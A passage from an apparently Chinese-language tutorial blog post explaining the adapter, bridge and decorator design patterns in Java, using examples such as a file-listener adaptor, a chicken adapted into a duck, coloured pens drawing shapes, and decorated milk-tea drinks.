做例子，此接口定义了很多的方法，用于对文件或文件夹进行监控，一旦发生了对应的操作，就会触发相应的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">FileAlterationListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onStart</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onDirectoryCreate</span><span class="params">(<span class="keyword">final</span> File directory)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onDirectoryChange</span><span class="params">(<span class="keyword">final</span> File directory)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onDirectoryDelete</span><span class="params">(<span class="keyword">final</span> File directory)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onFileChange</span><span class="params">(<span class="keyword">final</span> File file)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onStop</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此接口的一大问题是抽象方法太多了，如果我们要用这个接口，意味着我们要实现每一个抽象方法，如果我们只是想要监控文件夹中的<strong>文件创建</strong>和<strong>文件删除</strong>事件，可是我们还是不得不实现所有的方法，很明显，这不是我们想要的。</p><p>所以，我们需要下面的一个<strong>适配器</strong>，它用于实现上面的接口，但是<strong>所有的方法都是空方法</strong>，这样，我们就可以转而定义自己的类来继承下面这个类即可。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileAlterationListenerAdaptor</span> <span class="keyword">implements</span> <span class="title">FileAlterationListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStart</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDirectoryCreate</span><span class="params">(<span class="keyword">final</span> File directory)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDirectoryChange</span><span class="params">(<span class="keyword">final</span> File directory)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onDirectoryDelete</span><span class="params">(<span class="keyword">final</span> File directory)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFileChange</span><span class="params">(<span class="keyword">final</span> File file)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStop</span><span class="params">(<span class="keyword">final</span> FileAlterationObserver observer)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如我们可以定义以下类，我们仅仅需要实现我们想实现的方法就可以了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileMonitor</span> <span class="keyword">extends</span> <span class="title">FileAlterationListenerAdaptor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFileCreate</span><span class="params">(<span class="keyword">final</span> File file)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 文件创建</span></span><br><span class="line">        doSomething();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFileDelete</span><span class="params">(<span class="keyword">final</span> File file)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 文件删除</span></span><br><span class="line">        doSomething();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，上面说的只是适配器模式的其中一种，也是最简单的一种，无需多言。下面，再介绍<strong>“正统的”</strong>适配器模式。</p><h4><span id="对象适配器模式">对象适配器模式</span></h4><p>来看一个《Head First 设计模式》中的一个例子，我稍微修改了一下，看看怎么将鸡适配成鸭，这样鸡也能当鸭来用。因为，现在鸭这个接口，我们没有合适的实现类可以用，所以需要适配器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Duck</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">quack</span><span class="params">()</span></span>; <span class="comment">// 鸭的呱呱叫</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>; <span class="comment">// 飞</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Cock</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">gobble</span><span class="params">()</span></span>; <span class="comment">// 鸡的咕咕叫</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>; <span class="comment">// 飞</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WildCock</span> <span class="keyword">implements</span> <span class="title">Cock</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">gobble</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"咕咕叫"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"鸡也会飞哦"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>鸭接口有 fly() 和 quare() 两个方法，鸡 Cock 如果要冒充鸭，fly() 方法是现成的，但是鸡不会鸭的呱呱叫，没有 quack() 方法。这个时候就需要适配了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 毫无疑问，首先，这个适配器肯定需要 implements Duck，这样才能当做鸭来用</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CockAdapter</span> <span class="keyword">implements</span> <span class="title">Duck</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">    Cock cock;</span><br><span class="line">    <span class="comment">// 构造方法中需要一个鸡的实例，此类就是将这只鸡适配成鸭来用</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">CockAdapter</span><span class="params">(Cock cock)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cock = cock;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 实现鸭的呱呱叫方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">quack</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 内部其实是一只鸡的咕咕叫</span></span><br><span class="line">        cock.gobble();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        cock.fly();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端调用很简单了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 有一只野鸡</span></span><br><span class="line">  Cock wildCock = <span class="keyword">new</span> WildCock();</span><br><span class="line">  <span class="comment">// 成功将野鸡适配成鸭</span></span><br><span class="line">  Duck duck = <span class="keyword">new</span> CockAdapter(wildCock);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，大家也就知道了适配器模式是怎么回事了。无非是我们需要一只鸭，但是我们只有一只鸡，这个时候就需要定义一个适配器，由这个适配器来充当鸭，但是适配器里面的方法还是由鸡来实现的。</p><p>我们用一个图来简单说明下：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-1.png" alt="adapter-1"></p><p>上图应该还是很容易理解的，我就不做更多的解释了。下面，我们看看类适配模式怎么样的。</p><h4><span id="类适配器模式">类适配器模式</span></h4><p>废话少说，直接上图：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-2.png" alt="adapter-1"></p><p>看到这个图，大家应该很容易理解的吧，通过继承的方法，适配器自动获得了所需要的大部分方法。这个时候，客户端使用更加简单，直接 <code>Target t = new SomeAdapter();</code> 就可以了。</p><h4><span id="适配器模式总结">适配器模式总结</span></h4><ol><li><p>类适配和对象适配的异同</p><blockquote><p>一个采用继承，一个采用组合；</p><p>类适配属于静态实现，对象适配属于组合的动态实现，对象适配需要多实例化一个对象。</p><p>总体来说，对象适配用得比较多。</p></blockquote></li><li><p>适配器模式和代理模式的异同</p><p>比较这两种模式，其实是比较对象适配器模式和代理模式，在代码结构上，它们很相似，都需要一个具体的实现类的实例。但是它们的目的不一样，代理模式做的是增强原方法的活；适配器做的是适配的活，为的是提供“把鸡包装成鸭，然后当做鸭来使用”，而鸡和鸭它们之间原本没有继承关系。</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/adapter-5.png" alt="adapter-5"></p></li></ol><h3><span id="桥梁模式">桥梁模式</span></h3><p>理解桥梁模式，其实就是理解代码抽象和解耦。</p><p>我们首先需要一个桥梁，它是一个接口，定义提供的接口方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">DrawAPI</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是一系列实现类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RedPen</span> <span class="keyword">implements</span> <span class="title">DrawAPI</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"用红色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreenPen</span> <span class="keyword">implements</span> <span class="title">DrawAPI</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"用绿色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BluePen</span> <span class="keyword">implements</span> <span class="title">DrawAPI</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">(<span class="keyword">int</span> radius, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"用蓝色笔画图，radius:"</span> + radius + <span class="string">", x:"</span> + x + <span class="string">", y:"</span> + y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一个抽象类，此类的实现类都需要使用 DrawAPI：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> DrawAPI drawAPI;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">Shape</span><span class="params">(DrawAPI drawAPI)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.drawAPI = drawAPI;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义抽象类的子类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 圆形</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> radius;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Circle</span><span class="params">(<span class="keyword">int</span> radius, DrawAPI drawAPI)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(drawAPI);</span><br><span class="line">        <span class="keyword">this</span>.radius = radius;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        drawAPI.draw(radius, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 长方形</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> y;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rectangle</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, DrawAPI drawAPI)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(drawAPI);</span><br><span class="line">        <span class="keyword">this</span>.x = x;</span><br><span class="line">        <span class="keyword">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        drawAPI.draw(<span class="number">0</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们来看客户端演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Shape greenCircle = <span class="keyword">new</span> Circle(<span class="number">10</span>, <span class="keyword">new</span> GreenPen());</span><br><span class="line">    Shape redRectangle = <span class="keyword">new</span> Rectangle(<span class="number">4</span>, <span class="number">8</span>, <span class="keyword">new</span> RedPen());</span><br><span class="line">    greenCircle.draw();</span><br><span class="line">    redRectangle.draw();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能大家看上面一步步还不是特别清晰，我把所有的东西整合到一张图上：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/bridge-1.png" alt="bridge-1"></p><p>这回大家应该就知道抽象在哪里，怎么解耦了吧。桥梁模式的优点也是显而易见的，就是非常容易进行扩展。</p><blockquote><p>本节引用了<a href="https://www.tutorialspoint.com/design_pattern/bridge_pattern.htm" target="_blank" rel="noopener">这里</a>的例子，并对其进行了修改。</p></blockquote><h3><span id="装饰模式">装饰模式</span></h3><p>要把装饰模式说清楚明白，不是件容易的事情。也许读者知道 <strong>Java IO</strong> 中的几个类是典型的装饰模式的应用，但是读者不一定清楚其中的关系，也许看完就忘了，希望看完这节后，读者可以对其有更深的感悟。</p><p>首先，我们先看一个简单的图，看这个图的时候，了解下层次结构就可以了：</p><p><img src="https://www.javadoop.com/blogimages/design-pattern/decorator-1.png" alt="decorator-1"></p><p>我们来说说装饰模式的出发点，从图中可以看到，接口 <code>Component</code> 其实已经有了 <code>ConcreteComponentA</code> 和 <code>ConcreteComponentB</code> 两个实现类了，但是，如果我们要<strong>增强</strong>这两个实现类的话，我们就可以采用装饰模式，用具体的装饰器来<strong>装饰</strong>实现类，以达到增强的目的。</p><blockquote><p>从名字来简单解释下装饰器。既然说是装饰，那么往往就是<strong>添加小功能</strong>这种，而且，我们要满足可以添加多个小功能。最简单的，代理模式就可以实现功能的增强，但是代理不容易实现多个功能的增强，当然你可以说用代理包装代理的多层包装方式，但是那样的话代码就复杂了。</p></blockquote><p>首先明白一些简单的概念，从图中我们看到，所有的具体装饰者们 <strong>ConcreteDecorator*</strong> 都可以作为 Component 来使用，因为它们都实现了 Component 中的所有接口。它们和 Component 实现类 ConcreteComponent* 的区别是，它们只是装饰者，起<strong>装饰</strong>作用，也就是即使它们看上去牛逼轰轰，但是它们都只是在具体的实现中<strong>加了层皮来装饰</strong>而已。</p><blockquote><p>注意这段话中混杂在各个名词中的 Component 和 Decorator，别搞混了。</p></blockquote><p>下面来看看一个例子，先把装饰模式弄清楚，然后再介绍下 java io 中的装饰模式的应用。</p><p>最近大街上流行起来了“快乐柠檬”，我们把快乐柠檬的饮料分为三类：红茶、绿茶、咖啡，在这三大类的基础上，又增加了许多的口味，什么金桔柠檬红茶、金桔柠檬珍珠绿茶、芒果红茶、芒果绿茶、芒果珍珠红茶、烤珍珠红茶、烤珍珠芒果绿茶、椰香胚芽咖啡、焦糖可可咖啡等等，每家店都有很长的菜单，但是仔细看下，其实原料也没几样，但是可以搭配出很多组合，如果顾客需要，很多没出现在菜单中的饮料他们也是可以做的。</p><p>在这个例子中，红茶、绿茶、咖啡是最基础的饮料，其他的像金桔柠檬、芒果、珍珠、椰果、焦糖等都属于装饰用的。当然，在开发中，我们确实可以像门店一样，开发这些类：LemonBlackTea、LemonGreenTea、MangoBlackTea、MangoLemonGreenTea……但是，很快我们就发现，这样子干肯定是不行的，这会导致我们需要组合出所有的可能，而且如果客人需要在红茶中加双份柠檬怎么办？三份柠檬怎么办？</p><p>不说废话了，上代码。</p><p>首先，定义饮料抽象基类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Beverage</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 返回描述</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title">getDescription</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="comment">// 返回价格</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">double</span> <span class="title">cost</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后是三个基础饮料实现类，红茶、绿茶和咖啡：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlackTea</span> <span class="keyword">extends</span> <span class="title">Beverage</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"红茶"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GreenTea</span> <span class="keyword">extends</span> <span class="title">Beverage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"绿茶"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...<span class="comment">// 咖啡省略</span></span><br></pre></td></tr></table></figure><p>定义调料，也就是装饰者的基类，此类必须继承自 Beverage：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 调料</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Condiment</span> <span class="keyword">extends</span> <span class="title">Beverage</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们来定义柠檬、芒果等具体的调料，它们属于装饰者，毫无疑问，这些调料肯定都需要继承调料 Condiment 类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Lemon</span> <span class="keyword">extends</span> <span class="title">Condiment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Beverage bevarage;</span><br><span class="line">    <span class="comment">// 这里很关键，需要传入具体的饮料，如需要传入没有被装饰的红茶或绿茶，</span></span><br><span class="line">    <span class="comment">// 当然也可以传入已经装饰好的芒果绿茶，这样可以做芒果柠檬绿茶</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Lemon</span><span class="params">(Beverage bevarage)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bevarage = bevarage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 装饰</span></span><br><span class="line">        <span class="keyword">return</span> bevarage.getDescription() + <span class="string">", 加柠檬"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">cost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 装饰</span></span><br><span class="line">        <span class="keyword">return</span> beverage.cost() + <span class="number">2</span>; <span class="comment">// 加柠檬需要 2 元</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Mango</span> <span class="keyword">extends</span> <span class="title">Condiment</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Beverage bevarage;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Mango</span><span class="params">(Beverage bevarage)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bevarage = bevarage;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span 